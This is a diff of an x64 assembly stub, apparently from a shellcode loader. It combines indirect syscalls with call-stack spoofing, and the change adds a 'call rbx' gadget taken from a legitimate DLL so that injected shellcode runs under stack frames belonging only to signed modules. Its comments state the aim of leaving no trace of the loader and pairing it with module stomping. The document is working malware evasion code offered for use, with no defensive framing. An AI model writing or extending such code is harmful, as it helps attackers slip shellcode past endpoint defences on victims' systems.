@@ -1,13 +1,14 @@
 ;; AsmStub.asm - Indirect Syscall Stub + Call Stack Spoofing (x64 MASM)
 ;;
-;; SetSSn / RunSyscall   — indirect syscall engine
-;; SetSpoofTarget        — store shellcode address for callback
-;; SpoofCallback         — thread pool callback with stack frame spoofing
+;; SetSSn / RunSyscall   — indirect syscall engine (gadget randomization)
+;; SetSpoofTarget        — store shellcode + call gadget addresses
+;; SpoofCallback         — thread pool callback with gadget-injected stack frame
 
 .data
     wSSn            DWORD   000h        ; Current SSN
     qSyscallAddr    QWORD   000h        ; Address of syscall;ret in ntdll
     qTargetFunc     QWORD   000h        ; Shellcode address for spoofed callback
+    qCallGadget     QWORD   000h        ; Address of 'call rbx' gadget in legit DLL
 
 .code
 
@@ -36,18 +37,20 @@ RunSyscall PROC
 RunSyscall ENDP
 
 ; -----------------------------------------------
-; SetSpoofTarget(PVOID pTarget)
+; SetSpoofTarget(PVOID pTarget, PVOID pCallGadget)
 ;   RCX = shellcode / stomped address
-;   Stores target for SpoofCallback to jump to
+;   RDX = 'call rbx' gadget address (or NULL)
+;   Stores both for SpoofCallback to use
 ; -----------------------------------------------
 SetSpoofTarget PROC
     mov qTargetFunc, rcx
+    mov qCallGadget, rdx
     ret
 SetSpoofTarget ENDP
 
 ; -----------------------------------------------
 ; SpoofCallback - Thread pool work callback with
-;   call stack spoofing via tail-call
+;   call stack spoofing via gadget injection
 ;
 ; Called by ntdll thread pool as:
 ;   SpoofCallback(Instance, Context, Work)
@@ -55,24 +58,35 @@ SetSpoofTarget ENDP
 ;   RDX = PVOID Context (unused)
 ;   R8  = PTP_WORK
 ;
-; Stack on entry (placed by thread pool CALL):
-;   [RSP] = return to TppWorkpExecute (ntdll)
+; If qCallGadget is set (found 'call rbx' / FF D3
+; in a legitimate DLL):
+;   1. Load shellcode addr into RBX
+;   2. JMP to the 'call rbx' gadget
+;   3. Gadget executes CALL RBX:
+;      - Pushes gadget's return addr (inside legit DLL)
+;      - Jumps to RBX (shellcode)
 ;
-; Tail-call (JMP, not CALL) to shellcode means:
-;   - No new stack frame is created
-;   - Shellcode inherits the clean thread pool
-;     call stack:
-;       shellcode RIP
-;       -> TppWorkpExecute   (ntdll)
-;       -> TppWorkerThread   (ntdll)
-;       -> RtlUserThreadStart (ntdll)
-;   - No trace of the loader in the stack
-;   - Combined with module stomping, RIP itself
-;     is inside a legitimate signed DLL
+; Resulting call stack:
+;   shellcode RIP (in stomped/phantom DLL .text)
+;   -> return addr inside legitimate DLL (gadget site)
+;   -> TppWorkpExecute     (ntdll)
+;   -> TppWorkerThread     (ntdll)
+;   -> RtlUserThreadStart  (ntdll)
+;
+; All frames are in legitimate signed modules.
+;
+; If no gadget found, falls back to direct tail-call
+; (JMP to shellcode, no extra frame injected).
 ; -----------------------------------------------
 SpoofCallback PROC
-    mov rax, QWORD PTR [qTargetFunc]
-    jmp rax                         ; tail-call: preserves thread pool frames
+    mov rbx, QWORD PTR [qTargetFunc]   ; RBX = shellcode address
+    mov rax, QWORD PTR [qCallGadget]
+    test rax, rax
+    jz _direct
+    jmp rax                             ; JMP to 'call rbx' gadget in legit DLL
+                                        ; Gadget: CALL RBX -> pushes legit frame
+_direct:
+    jmp rbx                             ; Fallback: direct tail-call
 SpoofCallback ENDP
 
 end
